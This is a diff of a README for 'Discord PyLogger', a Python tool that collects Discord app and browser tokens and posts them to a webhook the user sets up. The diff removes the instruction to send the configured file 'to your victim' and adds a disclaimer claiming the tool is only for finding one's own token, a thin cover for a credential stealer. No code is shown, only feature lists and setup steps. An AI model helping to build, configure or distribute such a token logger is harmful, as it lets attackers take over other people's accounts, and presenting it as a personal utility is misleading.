@@ -1,6 +1,8 @@
 # Discord PyLogger
 Discord Python Logger, Easy setup!
 
+Made to find your discord token any other use to hack someone is not allowed and you may get your account banned. 
+
 # Features
 - Log's Discord App Token
 - Log's Discord Chrome Token
@@ -13,7 +15,7 @@ Discord Python Logger, Easy setup!
 3. Press "Edit with Idle"
 4. Scroll Down to the bottom
 5. When you see "Your Webhook Here", enter your webhook!
-6. Press Ctrl+S and send that .py file to your victim!
+6. Press Ctrl+S and you can use it to find your token! 
 -------------------------------------------------------
 How to make a webhook!
 
